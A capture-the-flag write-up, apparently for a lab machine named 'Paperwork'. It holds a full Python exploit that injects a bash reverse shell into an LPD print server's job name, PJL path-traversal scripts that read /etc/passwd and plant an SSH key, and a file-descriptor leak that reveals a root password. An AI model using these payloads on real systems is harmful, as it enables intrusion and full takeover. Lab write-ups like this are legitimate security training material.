# Paperwork

<img width="1587" height="277" alt="image" src="https://github.com/user-attachments/assets/5b41718d-9864-46b4-b9e8-37441958cd23" />



## nmap scan

```ruby
└─$ nmap -sCV -Pn 10.129.5.20   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-13 20:27 UTC
Nmap scan report for 10.129.5.20
Host is up (0.67s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.07 seconds
                                                                                         
```



## foudn in website zip file 

<img width="1919" height="798" alt="image" src="https://github.com/user-attachments/assets/f99625fa-54b1-4662-819f-be00b2f281d9" />

```
unzip paperwork-archive-v1.02.zip
```

<img width="1645" height="429" alt="image" src="https://github.com/user-attachments/assets/090d4a6e-08bc-4b80-8745-99a9255f11c4" />

##  In server.py, the `job_name` variable is passed directly into a shell command:

```py
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

> This is lead a command injection because the input isn't sanitized


## Writing the Exploit

<details>
  <summary>exploit</summary>



**Step 1 — Command byte:**

```python

data = self.sock.recv(1024)
command = data[0]
if command == 2:
    self.handle_print_job(data)
```
So first byte must be `\x02`. The rest of that first packet (`data[1:]`) is the **queue name**.

**Step 2 — Queue check:**

```python

queue = data[1:].decode().strip()
if queue not in VALID_QUEUE:
```

`VALID_QUEUE` comes from env var `LPD_QUEUE`. The webpage says the target queue is **`archive_intake`** .

⚠️ Note: `queue not in VALID_QUEUE` — this is a substring check, not equality. But sending exactly `archive_intake` works.

**Step 3 — The receive loop (this is the buggy part):**

```python

while True:
    chunk = self.sock.recv(1024)
    if not chunk: break
    subcommand = chunk[0]
    self.sock.send(b'\x00')
        parts = chunk[1:].decode(errors='ignore').split()
        if not parts: continue
        size = int(parts[0])
        content = b""
        while len(content) < size:
            content += self.sock.recv(size - len(content) + 1)
        decoded_content = content.decode(errors='ignore')
        job_name = "Unknown"
        for line in decoded_content.split('\n'):
            line = line.strip()
            if line.startswith('J'):
                job_name = line[1:]
                break
        subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

**Key observations (from the raw source):**

1. The server **doesn't actually check the subcommand byte** value. It just reads `chunk[0]`, echoes `\x00`, then parses `chunk[1:]` as `"<size> <filename>"`.
    
2. It reads exactly `size` bytes of content, then **breaks out of the while loop** after sending two more `\x00` bytes.
    
3. The `job_name` is extracted from any line starting with `J` inside the content.
    
4. `job_name` is then interpolated into a shell command wrapped in **single quotes** — classic command injection.
    

## The Injection Payload

The shell line becomes:

```bash

echo 'Archive: <job_name>' >> /tmp/archive.log
```

To break out of the single quotes and run our own command, we craft:

```text

J'; <our_command> #
```

Resulting in:

```bash

echo 'Archive: '; <our_command> #' >> /tmp/archive.log
```

`#` comments out the trailing `' >> /tmp/archive.log`.

## Exploit

```python
#!/usr/bin/env python3
import socket
import sys
import time

TARGET = "10.129.5.20"
LHOST  = "10.10.16.196"
LPORT  = 4444

def exploit():
    # Reverse shell payload injected as the job name.
    # Single-quote breakout + comment to kill the trailing quote.
    payload = f"'; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' #"

    # The control-file content. Job name MUST start on its own line with 'J'.
    control = f"J{payload}\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, 1515))
    s.settimeout(10)

    # --- Step 1: send command byte 0x02 + queue name ---
    s.sendall(b"\x02archive_intake")
    time.sleep(0.3)

    # Server may reply 0x00 here depending on timing; drain if present.
    try:
        s.recv(1024)
    except socket.timeout:
        pass

    # --- Step 2: send subcommand + size + filename header ---
    # Format parsed by server: "<size> <filename>\n"
    body = control.encode()
    header = f"{len(body)} cfA001paperwork\n".encode()
    # First byte of chunk is 'subcommand' (unchecked), then header.
    s.sendall(b"\x02" + header)
    time.sleep(0.3)

    # Drain any 0x00 ack
    try:
        s.recv(1024)
    except socket.timeout:
        pass

    # --- Step 3: send the actual control-file content ---
    s.sendall(body)
    time.sleep(0.5)

    # Drain final acks
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
    except socket.timeout:
        pass

    s.close()
    print("[+] Payload sent. Check your listener.")

if __name__ == "__main__":
    exploit()
```



  
</details>



---

<img width="1087" height="189" alt="image" src="https://github.com/user-attachments/assets/74da5ce9-cd55-46db-a770-37542e7b928e" />


## Enumeration

```
id
sudo -l
```

<img width="1138" height="172" alt="image" src="https://github.com/user-attachments/assets/3eef9eff-f38b-470e-abdc-6af039e4e04f" />

```
ss -tlnp
netstat -tlnp 2>/dev/null
```

<img width="1087" height="225" alt="image" src="https://github.com/user-attachments/assets/8c703bf9-f57c-468d-95fc-cf5f9e5dabfd" />


1. **Port `1337` listening on `127.0.0.1`** — this is almost certainly the "backend spooler management console" the web page mentioned was "offline". It's local-only, so we need to reach it from the box.
    
2. **Port `9100` on `127.0.0.1`** — that's a classic JetDirect/raw printing port. Probably the "legacy gateway" or `PRN-ARCHIVE-01`.
    
3. **Python PID 988** is the LPD server — that's our shell.
    
4. **`/etc/cron.daily/lprng`** exists — LPRng is installed. That's the printing subsystem, and it often has writable spool dirs or config files.


## Identify what's on 1337 and 9100


```
ps auxf | grep -Ei '1337|9100|python|node|php|spooler|printer'
curl -sv http://127.0.0.1:1337/ 2>&1 | head -50
```

<img width="1605" height="475" alt="image" src="https://github.com/user-attachments/assets/5b5428c8-d406-44ce-badb-148c8ca86e48" />


## Findings

```
root      969  /usr/bin/python3 /root/staging/CorpoSite/app.py          ← root Flask app
archivi+  986  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 ...
lp        988  /usr/bin/python3 /opt/LPDServer/server.py                ← our shell
root      1491 /usr/bin/python3 /usr/bin/paperwork-daemon               ← interesting
```

> **Port 1337 is the CorpoSite Flask app, running as `root`** — the Werkzeug banner on 127.0.0.1:1337 confirms it. This is a Flask app running as root, listening only on localhost. the Flask app on 1337 is just a static clone of the public site. No debug console, no /console, and the __debugger__ param didn't trigger anything. So the Flask app isn't the intended path (at least not via trivial debug).

---

## PJL Printer Service port 9100


1. **The correct PJL command names:**
    
    - `@PJL FSDIRLIST NAME="0:/"` → directory listing
        
    - `@PJL FSUPLOAD NAME="PATH"` → read file
        
    - `@PJL FSDOWNLOAD NAME="PATH" SIZE=N\r\n<data>` → write file
        
2. **`/home/archivist/.ssh/authorized_keys` exists and is empty (size 0)** — so we can just write our pubkey there.



> The target did not have nc, so I used Python sockets.

```
python3 - <<'PY'
import socket

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b"@PJL INFO ID\r\n")
print(s.recv(4096).decode(errors="replace"))
s.close()
PY
```



<img width="1256" height="198" alt="image" src="https://github.com/user-attachments/assets/99772a3c-970d-4286-bf38-eef9fd84d2ac" />

```
HP LASERJET 4ML
```

> This confirmed that TCP/9100 exposed a PJL printer service.

---


## confirm traversal read of` /etc/passwd`

```
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b'@PJL FSUPLOAD NAME="0:/../../../etc/passwd"\r\n')
s.settimeout(2)
out = b""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        out += d
except Exception:
    pass
print(out.decode(errors="replace"))
s.close()
PY
```

<img width="1383" height="456" alt="image" src="https://github.com/user-attachments/assets/43d8feae-721f-49a3-92cb-eb740f0d56eb" />


## Generate a key Write it into `archivist`'s `authorized_keys`

```
ssh-keygen -t ed25519 -f ~/paperwork_key -N ''
cat ~/paperwork_key.pub
```

```
python3 - <<'PY'
import socket

path = "0:/../../../home/archivist/.ssh/authorized_keys"
pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE3yRRDnMZHeDPrBLLhxhEf03HU+0CSVO4GgEmOanzQn kali@kali\n"  

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
header = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(pubkey)}\r\n'.encode()
s.sendall(header)
s.sendall(pubkey)
s.settimeout(2)
try:
    print("reply:", s.recv(4096))
except Exception as e:
    print("no reply:", e)
s.close()
PY
```


## SSH in as archivist

```
ssh -i ~/paperwork_key archivist@10.129.5.20
```

<img width="1301" height="318" alt="image" src="https://github.com/user-attachments/assets/d6ed69d2-6999-4b50-a9b7-c52d4402825e" />

---

## Privilege Escalation Reviewing paperwork-daemon

There is a root-owned Python daemon:

```text

root  /usr/bin/python3 /usr/bin/paperwork-daemon

```


Reading `/usr/bin/paperwork-daemon`:

```python

admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
...
socket_path = "/run/paperwork/mgmt.sock"
os.chmod(socket_path, 0o660)
os.chown(socket_path, 0, 1000)   # root:archivist
```

On every connection to `mgmt.sock`, the daemon:

1. Scans `/home/archivist/printer/logs/commands.log` for `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`.
    
2. **If found:** sends `admin_fd` (opened at startup) over the socket via `SCM_RIGHTS` ancillary data:
    

```python

log_fd = os.open(LOG_PATH, os.O_RDONLY)
evidence_bundle = array.array("i", [log_fd, admin_fd])
conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

That's the vulnerability: **a root process leaks an open fd to a root-owned file to an unprivileged client.**

Check socket ownership:

```bash

stat /run/paperwork/mgmt.sock
# srw-rw---- root archivist
```



## Once we're `archivist`, we can connect to `/run/paperwork/mgmt.sock` because it's `root:archivist 0660`.

> But make sure the trigger is armed first. The daemon only sends the `admin_fd` when `commands.log` contains `FSQUERY/FSUPLOAD/FSDOWNLOAD`. our earlier PJL probes almost certainly logged those strings already. we can verify by reading the log now that we're archivist:

```
cat /home/archivist/printer/logs/commands.log
```

<img width="1247" height="256" alt="image" src="https://github.com/user-attachments/assets/efafc99c-5c1b-4458-b9b8-2e6c5dbe23b5" />





## Trigger the fd leak


```
python3 - <<'PY'
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(4 * fds.itemsize))
print("msg:", msg)

for level, ctype, data in ancdata:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        # trim any padding
        n = len(data) - (len(data) % fds.itemsize)
        fds.frombytes(data[:n])

print("received fds:", list(fds))

for fd in fds:
    try:
        os.lseek(fd, 0, os.SEEK_SET)
        chunk = os.read(fd, 4096)
        print(f"\n===== FD {fd} ({len(chunk)} bytes) =====")
        print(chunk.decode(errors="replace"))
    except Exception as e:
        print(f"FD {fd} error: {e}")

s.close()
PY
```

<img width="1203" height="244" alt="image" src="https://github.com/user-attachments/assets/70e01a1e-d326-47e1-9447-53002e4b19a8" />


```
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

```
ssh root@10.129.5.20
```









































